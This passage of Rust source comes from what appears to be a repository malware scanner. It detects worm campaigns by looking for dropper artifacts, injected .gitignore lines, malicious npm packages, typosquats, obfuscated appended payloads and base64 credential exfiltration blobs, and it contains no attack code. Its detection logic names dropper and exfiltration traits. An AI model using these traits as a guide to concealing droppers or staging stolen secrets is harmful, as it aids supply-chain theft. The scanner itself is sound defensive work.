use std::collections::HashSet;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};

/// A never-set cancel flag, so the non-cancellable public entry points can delegate to the
/// cancellable internals without every caller threading a flag.
static NEVER: AtomicBool = AtomicBool::new(false);

use globset::{Glob, GlobSet, GlobSetBuilder};
use rayon::prelude::*;

use crate::capability::{gate, is_exfil_staging, score, CapabilityScore};
use crate::engine::SignatureEngine;
use crate::finding::{Finding, FindingKind, Severity};
use crate::git::reflog_has_amend;
use crate::pack::{Pack, ScannedFile};
use crate::repo_files::{GitTree, RepoFiles, WorkingTree};
use crate::surface::{classify, derived_targets, is_excluded_path, lifecycle_scripts, Surface};
use crate::walk::{discover_repos, discover_repos_cancellable};

#[derive(Debug, Clone, serde::Serialize)]
pub struct ScanReport {
    pub findings: Vec<Finding>,
    pub repos_scanned: usize,
}

fn build_globset(patterns: &[String]) -> GlobSet {
    let mut builder = GlobSetBuilder::new();
    for pattern in patterns {
        if let Ok(glob) = Glob::new(pattern) {
            builder.add(glob);
        }
        // Bare filename patterns should also match at any depth (monorepos
        // place config files under apps/*, packages/*, etc.).
        if !pattern.contains('/') {
            if let Ok(nested) = Glob::new(&format!("**/{pattern}")) {
                builder.add(nested);
            }
        }
    }
    builder.build().unwrap_or_else(|_| GlobSet::empty())
}

fn check_artifacts(repo: &Path, files: &dyn RepoFiles, pack: &Pack) -> Vec<Finding> {
    let mut findings = Vec::new();
    // Case-insensitive filesystems (macOS/APFS, Windows) report the same physical file for
    // artifact paths that differ only in case (e.g. shai-hulud-workflow.yml vs
    // Shai-hulud-workflow.yml). Dedup by the canonical on-disk path so one physical file
    // yields one finding; on a case-sensitive tree the paths canonicalize apart (or the
    // fallback keeps them distinct), so genuinely separate files are both still reported.
    let mut seen: HashSet<PathBuf> = HashSet::new();
    for artifact in &pack.manifest.artifacts {
        let ap = PathBuf::from(&artifact.path);
        if files.exists(&ap) {
            let identity = std::fs::canonicalize(repo.join(&ap)).unwrap_or_else(|_| ap.clone());
            if !seen.insert(identity) {
                continue;
            }
            findings.push(Finding {
                campaign: pack.manifest.id.clone(),
                severity: pack.manifest.severity.clone(),
                repo: repo.to_path_buf(),
                file: Some(ap),
                signature_id: format!("artifact:{}", artifact.path),
                kind: FindingKind::Artifact,
                evidence: format!("{} present ({})", artifact.path, artifact.label),
                remediable: true,
                online: None,
                git_ref: None,
            });
        }
    }
    findings
}

fn check_gitignore(repo: &Path, files: &dyn RepoFiles, pack: &Pack) -> Vec<Finding> {
    let mut findings = Vec::new();
    if pack.manifest.gitignore_injections.is_empty() {
        return findings;
    }
    // Respect the file source's membership: on a diff-restricted deep-scan tree, an UNCHANGED
    // .gitignore is not "present" here (the working-tree pass already covered it), so skip it
    // rather than re-reading via the unrestricted blob reader and double-reporting.
    if !files.exists(Path::new(".gitignore")) {
        return findings;
    }
    let content = match files.read(Path::new(".gitignore")) {
        Some(c) => c,
        None => return findings,
    };
    let lines: Vec<&str> = content.lines().map(|l| l.trim()).collect();
    for injected in &pack.manifest.gitignore_injections {
        if lines.iter().any(|l| l == injected) {
            findings.push(Finding {
                campaign: pack.manifest.id.clone(),
                severity: pack.manifest.severity.clone(),
                repo: repo.to_path_buf(),
                file: Some(PathBuf::from(".gitignore")),
                signature_id: format!("gitignore:{injected}"),
                kind: FindingKind::GitignoreInjection,
                evidence: format!("'{injected}' injected into .gitignore"),
                remediable: true,
                online: None,
                git_ref: None,
            });
        }
    }
    findings
}

fn check_npm(repo: &Path, files: &dyn RepoFiles, pack: &Pack) -> Vec<Finding> {
    let mut findings = Vec::new();
    if pack.manifest.bad_npm_packages.is_empty() {
        return findings;
    }
    // See check_gitignore: skip an unchanged package.json on a diff-restricted deep-scan tree.
    if !files.exists(Path::new("package.json")) {
        return findings;
    }
    let content = match files.read(Path::new("package.json")) {
        Some(c) => c,
        None => return findings,
    };
    for bad in &pack.manifest.bad_npm_packages {
        // Match the dependency key as it appears in package.json ("name":).
        let needle = format!("\"{bad}\"");
        if content.contains(&needle) {
            findings.push(Finding {
                campaign: pack.manifest.id.clone(),
                severity: pack.manifest.severity.clone(),
                repo: repo.to_path_buf(),
                file: Some(PathBuf::from("package.json")),
                signature_id: format!("npm:{bad}"),
                kind: FindingKind::NpmPackage,
                evidence: format!("malicious dependency '{bad}' in package.json"),
                remediable: false,
                online: None,
                git_ref: None,
            });
        }
    }
    findings
}

const MAX_CONTENT_BYTES: usize = 5 * 1024 * 1024;

fn looks_binary(content: &str) -> bool {
    content.as_bytes().iter().take(8192).any(|&b| b == 0)
}

/// Apply all file-based pack checks to a file source. Findings have git_ref = None;
/// the deep-scan caller stamps the branch ref afterward.
pub fn scan_files(repo: &Path, files: &dyn RepoFiles, packs: &[Pack]) -> Vec<Finding> {
    scan_files_inner(repo, files, packs, &NEVER)
}

/// Cancellable core of [`scan_files`]. The `cancel` flag is polled per file so a big repo can be
/// stopped mid-scan; a broken-off scan returns whatever findings it accumulated so far.
fn scan_files_inner(
    repo: &Path,
    files: &dyn RepoFiles,
    packs: &[Pack],
    cancel: &AtomicBool,
) -> Vec<Finding> {
    let engine = SignatureEngine::build(packs);
    // Per-pack target globsets, indexed alongside `packs`.
    let globsets: Vec<GlobSet> =
        packs.iter().map(|p| build_globset(&p.manifest.target_files)).collect();

    let mut findings = Vec::new();

    for rel in files.paths() {
        if cancel.load(Ordering::Relaxed) {
            break;
        }
        // Build-output dirs and minified bundles carry legitimately obfuscated/high-entropy
        // code; exclude them here so the pack pass matches the capability pass and does not
        // fire (e.g. entropy-tail) on benign minified output.
        if is_excluded_path(rel) {
            continue;
        }
        // Which packs target this file?
        let targeting: Vec<usize> = globsets
            .iter()
            .enumerate()
            .filter(|(_, g)| g.is_match(rel))
            .map(|(i, _)| i)
            .collect();
        if targeting.is_empty() {
            continue;
        }
        let content = match files.read(rel) {
            Some(c) => c,
            None => continue,
        };
        if content.len() > MAX_CONTENT_BYTES || looks_binary(&content) {
            continue;
        }
        let targeting_ids: std::collections::HashSet<&str> =
            targeting.iter().map(|&i| packs[i].manifest.id.as_str()).collect();

        // Content signatures via the shared engine, gated by target membership.
        for hit in engine.scan_content(&content) {
            // Relies on pack ids being unique: a hit's pack_id must map to exactly one
            // pack, so this membership check correctly scopes hits to packs targeting
            // this file. Duplicate pack ids would misattribute or drop hits here.
            if !targeting_ids.contains(hit.pack_id.as_str()) {
                continue;
            }
            findings.push(Finding {
                campaign: hit.pack_id.clone(),
                severity: hit.severity.clone(),
                repo: repo.to_path_buf(),
                file: Some(rel.clone()),
                signature_id: hit.signature_id.clone(),
                kind: FindingKind::ContentSignature,
                evidence: format!("content signature '{}' matched", hit.signature_id),
                remediable: true,
                online: None,
                git_ref: None,
            });
        }

        // IOC domains + analyzer stay per-pack (small lists; not worth the engine).
        for &i in &targeting {
            let pack = &packs[i];
            for domain in &pack.manifest.ioc_domains {
                if content.contains(domain) {
                    findings.push(Finding {
                        campaign: pack.manifest.id.clone(),
                        severity: Severity::Medium,
                        repo: repo.to_path_buf(),
                        file: Some(rel.clone()),
                        signature_id: format!("ioc-domain:{domain}"),
                        kind: FindingKind::IocDomain,
                        evidence: format!("C2 indicator domain '{domain}' referenced"),
                        remediable: false,
                        online: None,
                        git_ref: None,
                    });
                }
            }
            if let Some(analyzer) = &pack.analyzer {
                let scanned = ScannedFile {
                    repo: repo.to_path_buf(),
                    path: rel.clone(),
                    content: content.clone(),
                };
                findings.extend(analyzer.analyze(&scanned));
            }
        }
    }

    for pack in packs {
        findings.extend(check_artifacts(repo, files, pack));
        findings.extend(check_gitignore(repo, files, pack));
        findings.extend(check_npm(repo, files, pack));
        findings.extend(crate::lockfile::check_lockfiles(repo, files, pack));
    }

    // `remediable` must track whether an auto-remediation action actually exists
    // (remediate::action_for is the single source of that mapping). A ContentSignature
    // or Analyzer hit from a campaign with no strip strategy is NOT auto-remediable;
    // stamping it true would let exit-code resolution and branch-tip routing treat
    // unfixable malware as "resolved". Re-stamp uniformly so no path drifts.
    for f in &mut findings {
        f.remediable = crate::remediate::action_for(f, packs).is_some();
    }
    findings
}

fn cap_finding(repo: &Path, file: PathBuf, surface: Surface, s: &CapabilityScore) -> Finding {
    let top = s.evidence.first().cloned().unwrap_or_else(|| "capability".into());
    Finding {
        campaign: "generic".into(),
        severity: Severity::Critical,
        repo: repo.to_path_buf(),
        file: Some(file),
        signature_id: format!("capability:{surface:?}:{top}"),
        kind: FindingKind::Capability,
        evidence: format!("auto-run {surface:?}: {}", s.evidence.join(" + ")),
        remediable: false,
        online: None,
        git_ref: None,
    }
}

fn push_if_gated(
    findings: &mut Vec<Finding>,
    repo: &Path,
    file: PathBuf,
    surface: Surface,
    content: &str,
) {
    let s = score(content, surface);
    if gate(surface, &s) {
        findings.push(cap_finding(repo, file, surface, &s));
    }
}

/// Promote local `node ./X.js` targets of an auto-run command to `DerivedScript`
/// units and score them (one hop). `scored` dedups against files already scored
/// under another surface, so a reachable file is never double-reported.
///
/// `base` is the directory the command runs from: a package.json lifecycle script
/// runs with CWD = its manifest dir, a workflow/tasks step from the repo root. The
/// manifest-relative path is tried first (spec §6), then the repo-root path, so
/// nested-monorepo droppers are reached without regressing root-level ones.
fn expand_derived(
    findings: &mut Vec<Finding>,
    repo: &Path,
    files: &dyn RepoFiles,
    scored: &mut HashSet<PathBuf>,
    base: &Path,
    command: &str,
) {
    for tgt in derived_targets(command) {
        let mut candidates = vec![base.join(&tgt)];
        let root_rel = PathBuf::from(&tgt);
        if !candidates.contains(&root_rel) {
            candidates.push(root_rel);
        }
        for tp in candidates {
            if is_excluded_path(&tp) || !scored.insert(tp.clone()) {
                continue;
            }
            if let Some(dc) = files.read(&tp) {
                if dc.len() <= MAX_CONTENT_BYTES && !looks_binary(&dc) {
                    push_if_gated(findings, repo, tp, Surface::DerivedScript, &dc);
                }
            }
        }
    }
}

/// Campaign-agnostic capability pass over an auto-run surface. Works on any
/// `RepoFiles` (working tree or a branch tip). The physical `.git/hooks` pass
/// is separate (`scan_git_hooks`) because it applies only to the working tree.
pub fn scan_capabilities(repo: &Path, files: &dyn RepoFiles) -> Vec<Finding> {
    scan_capabilities_inner(repo, files, &NEVER)
}

/// Cancellable core of [`scan_capabilities`]. Both file passes poll `cancel` per file so a large
/// working tree can be stopped mid-scan.
fn scan_capabilities_inner(repo: &Path, files: &dyn RepoFiles, cancel: &AtomicBool) -> Vec<Finding> {
    let mut findings = Vec::new();
    // Real file paths already scored under some surface — prevents a reachable
    // DerivedScript that is also a classified ConfigFile from double-reporting.
    // DerivedScript is claimed in pass 0 (below), before the classify pass, so a file
    // that is both a reachable dropper and a classified ConfigFile is scored under the
    // strictly-more-sensitive DerivedScript surface regardless of `files.paths()` order.
    let mut scored: HashSet<PathBuf> = HashSet::new();

    // --- Pass 0: one-hop reachability (DerivedScript). ---
    // Only command-bearing files are read here (package.json lifecycle scripts, workflow
    // and folder-open tasks.json bodies); their local `node ./X.js` targets are promoted
    // to DerivedScript and scored first.
    for rel in files.paths() {
        if cancel.load(Ordering::Relaxed) {
            break;
        }
        if is_excluded_path(rel) {
            continue;
        }
        let is_pkg = rel.file_name().map(|n| n == "package.json").unwrap_or(false);
        let cmd_surface =
            classify(rel).filter(|s| matches!(s, Surface::WorkflowFile | Surface::TasksJson));
        if !is_pkg && cmd_surface.is_none() {
            continue;
        }
        let content = match files.read(rel) {
            Some(c) if c.len() <= MAX_CONTENT_BYTES && !looks_binary(&c) => c,
            _ => continue,
        };
        if is_pkg {
            // Lifecycle scripts run with CWD = the manifest's dir.
            let base = rel.parent().unwrap_or_else(|| Path::new(""));
            for (_key, script) in lifecycle_scripts(&content) {
                expand_derived(&mut findings, repo, files, &mut scored, base, &script);
            }
        }
        if let Some(surface) = cmd_surface {
            // tasks.json only auto-runs (and thus reaches a dropper) on folder open.
            let auto_run_ok = surface != Surface::TasksJson || {
                let low = content.to_lowercase();
                low.contains("folderopen") || low.contains("allowautomatictasks")
            };
            if auto_run_ok {
                // Workflow / tasks steps run from the repo root.
                expand_derived(&mut findings, repo, files, &mut scored, Path::new(""), &content);
            }
        }
    }

    // --- Pass 1: classify each file, score lifecycle scripts, check exfil-staging. ---
    for rel in files.paths() {
        if cancel.load(Ordering::Relaxed) {
            break;
        }
        if is_excluded_path(rel) {
            continue;
        }
        // Path-only interest gate: classify() needs no I/O, so only READ files that can
        // actually be a surface, a package.json (lifecycle), or a root *.json (exfil blob).
        // Without this, the whole working tree (multi-GB target/ dirs) was read every scan.
        let surface = classify(rel);
        let is_pkg = rel.file_name().map(|n| n == "package.json").unwrap_or(false);
        let is_root_json = rel.parent().map(|p| p.as_os_str().is_empty()).unwrap_or(true)
            && rel.extension().map(|e| e == "json").unwrap_or(false);
        if surface.is_none() && !is_pkg && !is_root_json {
            continue;
        }
        // Read once; skip oversized/binary blobs (mirrors scan_files).
        let content = match files.read(rel) {
            Some(c) if c.len() <= MAX_CONTENT_BYTES && !looks_binary(&c) => c,
            _ => continue,
        };

        if let Some(surface) = surface {
            // A folderOpen precondition gates TasksJson (auto-runs on folder open only).
            let auto_run_ok = surface != Surface::TasksJson || {
                let low = content.to_lowercase();
                low.contains("folderopen") || low.contains("allowautomatictasks")
            };
            // A file already claimed as DerivedScript in pass 0 is skipped here.
            if auto_run_ok && scored.insert(rel.clone()) {
                push_if_gated(&mut findings, repo, rel.clone(), surface, &content);
            }
        }

        if is_pkg {
            for (key, script) in lifecycle_scripts(&content) {
                let vfile = PathBuf::from(format!("{}#{}", rel.display(), key));
                push_if_gated(&mut findings, repo, vfile, Surface::LifecycleScript, &script);
            }
        }

        // ExfilStaging: root-level *.json holding a base64 credential blob.
        if is_root_json && is_exfil_staging(&content) {
            findings.push(Finding {
                campaign: "generic".into(),
                severity: Severity::Critical,
                repo: repo.to_path_buf(),
                file: Some(rel.clone()),
                signature_id: "capability:exfil-staging".into(),
                kind: FindingKind::Capability,
                evidence: format!("exfil-staging: base64 credential blob ({})", rel.display()),
                remediable: false,
                online: None,
                git_ref: None,
            });
        }
    }

    findings
}

/// Physical `.git/hooks/*` (non-`.sample`) scan — working tree only; the hooks
/// dir is pruned from `walk_repo_files` and absent from a `GitTree`.
fn scan_git_hooks(repo: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();
    let hooks_dir = repo.join(".git/hooks");
    if let Ok(entries) = std::fs::read_dir(&hooks_dir) {
        for e in entries.flatten() {
            let p = e.path();
            if p.extension().map(|x| x == "sample").unwrap_or(false) {
                continue;
            }
            if let Ok(content) = std::fs::read_to_string(&p) {
                let rel = p.strip_prefix(repo).unwrap_or(&p).to_path_buf();
                push_if_gated(&mut findings, repo, rel, Surface::GitHook, &content);
            }
        }
    }
    findings
}

/// When a *remediable* campaign (pack) finding already covers a file, drop the additive
/// generic capability finding on that same file so the report shows the more actionable,
/// remediable, campaign-attributed finding rather than a duplicate. A weaker, non-remediable
/// pack finding (e.g. a Medium `IocDomain` reference) must NOT suppress a Critical capability
/// finding — otherwise the stronger, actionable evidence is lost to the weaker indicator.
fn dedup_capability_against_packs(findings: &mut Vec<Finding>) {
    let pack_files: HashSet<PathBuf> = findings
        .iter()
        .filter(|f| f.kind != FindingKind::Capability && f.remediable)
        .filter_map(|f| f.file.clone())
        .collect();
    findings.retain(|f| {
        f.kind != FindingKind::Capability
            || f.file.as_ref().map(|p| !pack_files.contains(p)).unwrap_or(true)
    });
}

/// Does an INSTALLED npm package (a `node_modules/<name>` dir on disk) exhibit dropper behaviour?
/// This is the FP-safe corroborator for a typosquat NAME hit — and it must be provably safe, because
/// the name matcher is deliberately broad (hundreds of legit `tailwindcss-*`/`chalk-*` plugins match
/// the decoration rule). Only two signals qualify, both mathematically absent from legitimate code:
/// (1) the injected-payload structure (a `_$_hex` decoder / ≥200-space padding run), or (2) a
/// lifecycle (install) script that trips the surface gate (download-and-exec + concealment). A
/// legit look-alike plugin has neither, so it never becomes a finding.
/// Pure dropper-behaviour verdict given a package's `package.json` text and (optionally) its main
/// entry-file content. The single source of truth for "is this npm package a dropper", reused by the
/// installed-package check (reads from disk) and the online pre-install check (fetches from the
/// registry) so the two never drift. Only two FP-safe signals qualify: an install script that trips
/// the surface gate, or the injected-payload structure in the entry.
pub fn package_dropper_verdict(package_json: &str, entry: Option<&str>) -> bool {
    for (_key, script) in lifecycle_scripts(package_json) {
        if gate(Surface::LifecycleScript, &score(&script, Surface::LifecycleScript)) {
            return true;
        }
    }
    if let Some(content) = entry {
        if content.len() <= MAX_CONTENT_BYTES
            && !looks_binary(content)
            && crate::capability::injected_payload(content)
        {
            return true;
        }
    }
    false
}

/// Does an INSTALLED npm package (a `node_modules/<name>` dir on disk) exhibit dropper behaviour?
/// The FP-safe corroborator for a typosquat NAME hit — a legit look-alike plugin has none. Reads the
/// package.json and candidate entry files from disk and defers to [`package_dropper_verdict`].
fn package_dropper_behavior(dir: &Path) -> bool {
    let pj = std::fs::read_to_string(dir.join("package.json")).unwrap_or_default();
    let main = serde_json::from_str::<serde_json::Value>(&pj)
        .ok()
        .and_then(|v| v.get("main").and_then(|m| m.as_str()).map(String::from));
    let mut candidates = vec!["index.js".to_string(), "index.mjs".to_string(), "index.cjs".to_string()];
    if let Some(m) = main {
        candidates.insert(0, m);
    }
    if package_dropper_verdict(&pj, None) {
        return true;
    }
    candidates
        .iter()
        .filter_map(|c| std::fs::read_to_string(dir.join(c)).ok())
        .any(|content| package_dropper_verdict(&pj, Some(&content)))
}

/// Delivery-vector detection: flag npm dependencies whose NAME is a likely typosquat of a popular
/// package. The name alone is a WEAK signal (the ecosystem is full of `<tool>-<plugin>` names), so
/// a hit is promoted to a visible **Medium** finding ONLY when the installed package also shows
/// dropper behaviour ([`package_dropper_behavior`]); a name-only hit (package not installed, or
/// clean) becomes a suppressed community lead (`pkg-community:` id) instead. This catches the
/// PolinRider *delivery* packages (`tailwindcss-style-animate`, `chalk-logger`, …) structurally —
/// no static name list — while never false-positiving on a legit look-alike dependency.
pub fn scan_dependency_typosquats(
    repo: &Path,
    files: &dyn RepoFiles,
    packs: &[Pack],
) -> Vec<Finding> {
    // Names a pack already tracks (version-aware) are that pack's domain — the lockfile / node_modules
    // checks handle them authoritatively (and respect version pins). Skip them here so this pass is
    // purely ADDITIVE: it only surfaces typosquats NOT yet in any pack, and never overrides a pack's
    // version-pinning decision (which would be a false positive on a deliberately-safe version).
    let known: HashSet<&str> = packs
        .iter()
        .filter_map(|p| p.manifest.bad_packages.get("npm"))
        .flat_map(|v| v.iter().map(|b| b.name.as_str()))
        .collect();
    // Collect declared + locked npm dependency names.
    let mut names: HashSet<String> = HashSet::new();
    for rel in files.paths() {
        let bn = rel.file_name().and_then(|n| n.to_str()).unwrap_or("");
        if bn == "package.json" {
            if let Some(c) = files.read(rel) {
                if let Ok(v) = serde_json::from_str::<serde_json::Value>(&c) {
                    for field in ["dependencies", "devDependencies", "optionalDependencies"] {
                        if let Some(o) = v.get(field).and_then(|x| x.as_object()) {
                            names.extend(o.keys().cloned());
                        }
                    }
                }
            }
        } else if crate::lockfile::LOCKFILES.iter().any(|(f, eco)| *f == bn && *eco == "npm") {
            if let Some(c) = files.read(rel) {
                for e in crate::lockfile::parse_lockfile(bn, &c) {
                    names.insert(e.name);
                }
            }
        }
    }

    let mut findings = Vec::new();
    for name in names {
        if known.contains(name.as_str()) {
            continue; // a pack already covers this name, version-aware
        }
        let Some(hit) = crate::typosquat::typosquat_of(&name) else {
            continue;
        };
        let pkg_dir = repo.join("node_modules").join(&name);
        let malicious = pkg_dir.is_dir() && package_dropper_behavior(&pkg_dir);
        let (severity, signature_id, evidence) = if malicious {
            // Corroborated (either name-signal kind) → visible Medium.
            (
                Severity::Medium,
                format!("typosquat:{name}"),
                format!(
                    "dependency '{name}' is a likely typosquat of '{}' AND the installed package shows dropper behaviour",
                    hit.of
                ),
            )
        } else if hit.kind == crate::typosquat::TyposquatKind::Misspelling {
            // A one-edit misspelling of a popular name is a strong-enough NAME signal to surface as
            // a suppressed community lead even without behavioural corroboration.
            (
                Severity::Low,
                format!("pkg-community:typosquat:{name}"),
                format!("dependency '{name}' name-resembles '{}' (community lead — no dropper behaviour observed)", hit.of),
            )
        } else {
            // A DECORATION with no dropper behaviour is too weak to report at all — the legit
            // ecosystem is full of `<root>-<word>` names, so a name-only decoration lead would be a
            // false positive. Corroboration (the Medium branch) is the only way it surfaces.
            continue;
        };
        findings.push(Finding {
            campaign: "polinrider".into(),
            severity,
            repo: repo.to_path_buf(),
            file: Some(PathBuf::from("package.json")),
            signature_id,
            kind: FindingKind::NpmPackage,
            evidence,
            remediable: false,
            online: None,
            git_ref: None,
        });
    }
    findings
}

/// Code-file extensions the repo-wide injection pass reads. The PolinRider payload is appended JS/TS
/// (obfuscated blob), so only source that can host it is scanned — keeps the extra I/O bounded and
/// avoids reading data/binary assets.
const INJECTION_SCAN_EXTS: &[&str] =
    &["js", "mjs", "cjs", "jsx", "ts", "tsx", "mts", "cts", "vue", "svelte", "astro"];

/// Repo-wide structural injection catch-all. The surface/target passes only read recognized configs
/// and entry files, but PolinRider appends its payload to the last line of ARBITRARY executable
/// source — `server.js`, `routes/*.js`, `Gruntfile.js`, `.prettierrc.mjs`, controllers, entry points
/// — which those passes never see (in a 692-repo GitHub corpus, ~14% of infections lived only in
/// such files). This pass reads every non-excluded, non-binary code file and fires on the
/// version-independent injection structure ([`crate::capability::injected_payload`]): a padding-run
/// line or a `_$_hex` decoder identifier, both FP-safe by construction. Findings are attributed to
/// `polinrider` as `Analyzer`, so they route through the structural strip; the caller dedups against
/// surface findings so an already-flagged config is not double-reported.
pub fn scan_injection_structure(repo: &Path, files: &dyn RepoFiles) -> Vec<Finding> {
    scan_injection_structure_inner(repo, files, &NEVER)
}

fn scan_injection_structure_inner(
    repo: &Path,
    files: &dyn RepoFiles,
    cancel: &AtomicBool,
) -> Vec<Finding> {
    let mut findings = Vec::new();
    for rel in files.paths() {
        if cancel.load(Ordering::Relaxed) {
            break;
        }
        if is_excluded_path(rel) {
            continue;
        }
        let ext = rel
            .extension()
            .and_then(|e| e.to_str())
            .map(|e| e.to_ascii_lowercase())
            .unwrap_or_default();
        if !INJECTION_SCAN_EXTS.contains(&ext.as_str()) {
            continue;
        }
        let content = match files.read(rel) {
            Some(c) => c,
            None => continue,
        };
        if content.len() > MAX_CONTENT_BYTES || looks_binary(&content) {
            continue;
        }
        if crate::capability::injected_payload(&content) {
            findings.push(Finding {
                campaign: "polinrider".into(),
                severity: Severity::Critical,
                repo: repo.to_path_buf(),
                file: Some(rel.clone()),
                signature_id: "injection:structural".into(),
                kind: FindingKind::Analyzer,
                evidence:
                    "injected payload structure (padding run / decoder identifier) in a non-config source file"
                        .into(),
                remediable: true,
                online: None,
                git_ref: None,
            });
        }
    }
    findings
}

/// Full campaign + capability scan over any file source (a working tree, a branch tip, or
/// a clone-free API tree), deduped. This is the single shared body so every scan path —
/// local (`scan_repo`), deep (`deep_scan_repo`), and GitHub API (`wormward-github`) — runs
/// the same detectors and can never drift apart.
///
/// The physical `.git/hooks` pass and the reflog heuristic are working-tree-only and are
/// applied separately by `scan_repo`; they cannot run over a non-working-tree source.
pub fn scan_tree(repo: &Path, files: &dyn RepoFiles, packs: &[Pack]) -> Vec<Finding> {
    scan_tree_inner(repo, files, packs, &NEVER)
}

/// Cancellable core of [`scan_tree`]. Both file passes poll `cancel`, so a big single repo
/// (e.g. a monorepo working tree) can be stopped mid-scan rather than only between repos.
fn scan_tree_inner(
    repo: &Path,
    files: &dyn RepoFiles,
    packs: &[Pack],
    cancel: &AtomicBool,
) -> Vec<Finding> {
    let mut findings = scan_files_inner(repo, files, packs, cancel);
    findings.extend(scan_capabilities_inner(repo, files, cancel));
    dedup_capability_against_packs(&mut findings);
    // Repo-wide structural catch-all for the family's NON-config hosts (arbitrary source files no
    // surface/target pass reads). Add a structural finding only for files not already covered, so a
    // config the surface passes flagged is not double-reported.
    let covered: HashSet<PathBuf> = findings.iter().filter_map(|f| f.file.clone()).collect();
    for f in scan_injection_structure_inner(repo, files, cancel) {
        if f.file.as_ref().map(|p| !covered.contains(p)).unwrap_or(true) {
            findings.push(f);
        }
    }
    // Capability findings default to non-remediable, but a few (e.g. a malicious .vscode/tasks.json)
    // now map to a delete action. Re-stamp uniformly so the `remediable` flag tracks the single
    // action_for source of truth for every finding kind, not just the pack-pass ones.
    for f in &mut findings {
        f.remediable = crate::remediate::action_for(f, packs).is_some();
    }
    findings
}

pub fn scan_repo(repo: &Path, packs: &[Pack]) -> Vec<Finding> {
    scan_repo_inner(repo, packs, &NEVER)
}

/// Cancellable core of [`scan_repo`]. Threads `cancel` into the working-tree pass so a Stop
/// request lands mid-repo; the reflog heuristic is skipped once cancelled.
fn scan_repo_inner(repo: &Path, packs: &[Pack], cancel: &AtomicBool) -> Vec<Finding> {
    let working = WorkingTree::new_cancellable(repo, cancel);
    let mut findings = scan_tree_inner(repo, &working, packs, cancel);
    // .git/hooks is a working-tree-only surface (absent from a GitTree / ApiTree).
    findings.extend(scan_git_hooks(repo));
    // Installed dependencies (node_modules) are pruned from the general walk; scan them targeted.
    if !cancel.load(Ordering::Relaxed) {
        findings.extend(scan_node_modules(repo, packs));
    }
    // Delivery-vector: dependency-name typosquats corroborated by installed-package dropper
    // behaviour (working-tree only — needs package.json/lockfiles + node_modules on disk).
    if !cancel.load(Ordering::Relaxed) {
        findings.extend(scan_dependency_typosquats(repo, &working, packs));
    }

    if !cancel.load(Ordering::Relaxed) && !findings.is_empty() && reflog_has_amend(repo) {
        // Attribute the reflog corroboration to a campaign (pack) finding when one
        // exists; fall back to "generic" only if every finding is capability-only.
        let campaign = findings
            .iter()
            .map(|f| f.campaign.as_str())
            .find(|c| *c != "generic")
            .unwrap_or("generic")
            .to_string();
        findings.push(Finding {
            campaign,
            severity: Severity::Medium,
            repo: repo.to_path_buf(),
            file: None,
            signature_id: "git-reflog-amend".into(),
            kind: FindingKind::GitReflog,
            evidence: "amended commits found in reflog (consistent with worm propagation)".into(),
            remediable: false,
            online: None,
            git_ref: None,
        });
    }
    findings
}

pub fn scan(roots: &[PathBuf], packs: &[Pack]) -> ScanReport {
    let mut repos: Vec<PathBuf> = Vec::new();
    for root in roots {
        repos.extend(discover_repos(root));
    }
    repos.sort();
    repos.dedup();

    let findings: Vec<Finding> = repos
        .par_iter()
        .flat_map(|repo| scan_repo(repo, packs))
        .collect();

    ScanReport {
        findings,
        repos_scanned: repos.len(),
    }
}

fn branch_commits(repo: &Path) -> Vec<(String, String)> {
    // Format: "<oid> <short refname> <symref>". oids and refnames contain no spaces, so the
    // fields split cleanly; `symref` is non-empty only for symbolic refs.
    let out = crate::proc::git()
        .arg("-C")
        .arg(repo)
        .args([
            "for-each-ref",
            "--format=%(objectname) %(refname:short) %(symref)",
            "refs/heads",
            "refs/remotes",
        ])
        .output();
    let out = match out {
        Ok(o) if o.status.success() => o,
        _ => return Vec::new(),
    };
    String::from_utf8_lossy(&out.stdout)
        .lines()
        .filter_map(|line| {
            let mut parts = line.splitn(3, ' ');
            let oid = parts.next()?.to_string();
            let name = parts.next()?.to_string();
            let symref = parts.next().unwrap_or("");
            // Skip symbolic refs — chiefly `refs/remotes/origin/HEAD`, whose short name is the
            // bare remote ("origin"). It only points at a real branch that is already scanned
            // (e.g. origin/main) and cannot be rewritten as a branch, so cleaning it fails with
            // "branch 'origin' is neither a local nor a remote-tracking ref".
            if !symref.is_empty() {
                return None;
            }
            Some((oid, name))
        })
        .collect()
}

fn head_commit(repo: &Path) -> Option<String> {
    let out = crate::proc::git()
        .arg("-C")
        .arg(repo)
        .args(["rev-parse", "HEAD"])
        .output()
        .ok()?;
    if !out.status.success() {
        return None;
    }
    Some(String::from_utf8_lossy(&out.stdout).trim().to_string())
}

/// Paths that differ between two commits (`git diff --name-only <base> <tip>`). NUL-delimited so
/// special/non-ASCII paths survive. Commit-to-commit (no working-tree stat), so it stays cheap.
fn diff_paths(repo: &Path, base: &str, tip: &str) -> Vec<PathBuf> {
    let out = crate::proc::git()
        .arg("-C")
        .arg(repo)
        .args(["diff", "--name-only", "-z", base, tip])
        .output();
    let out = match out {
        Ok(o) if o.status.success() => o,
        _ => return Vec::new(),
    };
    String::from_utf8_lossy(&out.stdout)
        .split('\0')
        .filter(|s| !s.is_empty())
        .map(PathBuf::from)
        .collect()
}

/// Scan the tip tree of every local/remote branch (deduped by commit, excluding HEAD's
/// commit which the working-tree pass already covers). Findings carry the branch ref.
pub fn deep_scan_repo(repo: &Path, packs: &[Pack]) -> Vec<Finding> {
    deep_scan_repo_cancellable(repo, packs, &std::sync::atomic::AtomicBool::new(false))
}

/// Like [`deep_scan_repo`] but bails out between branch tips as soon as `cancel` is set, so a
/// repo with many branches can't block a Stop request or freeze a streaming scan mid-repo.
pub fn deep_scan_repo_cancellable(
    repo: &Path,
    packs: &[Pack],
    cancel: &std::sync::atomic::AtomicBool,
) -> Vec<Finding> {
    let head = head_commit(repo);
    let mut seen = std::collections::HashSet::new();
    let mut findings = Vec::new();
    // One `git cat-file --batch` reader shared by every tip, so a many-branch repo spawns a single
    // blob reader instead of one per tip (the tip specs carry their own commit, so one reader
    // serves them all).
    let reader = GitTree::shared_reader();
    for (oid, name) in branch_commits(repo) {
        if cancel.load(std::sync::atomic::Ordering::Relaxed) {
            break;
        }
        if head.as_deref() == Some(oid.as_str()) {
            continue;
        }
        if !seen.insert(oid.clone()) {
            continue;
        }
        // Scan ONLY the files this tip changes vs HEAD. Content shared with HEAD is already covered
        // by the working-tree pass, so the tip's added/changed files are all that is left to check.
        // This drops per-tip work from the whole tree to the (usually tiny) diff — the key to a fast
        // deep scan on a many-branch repo WITHOUT adding parallelism (and thus without more heat).
        let tree = match head.as_deref() {
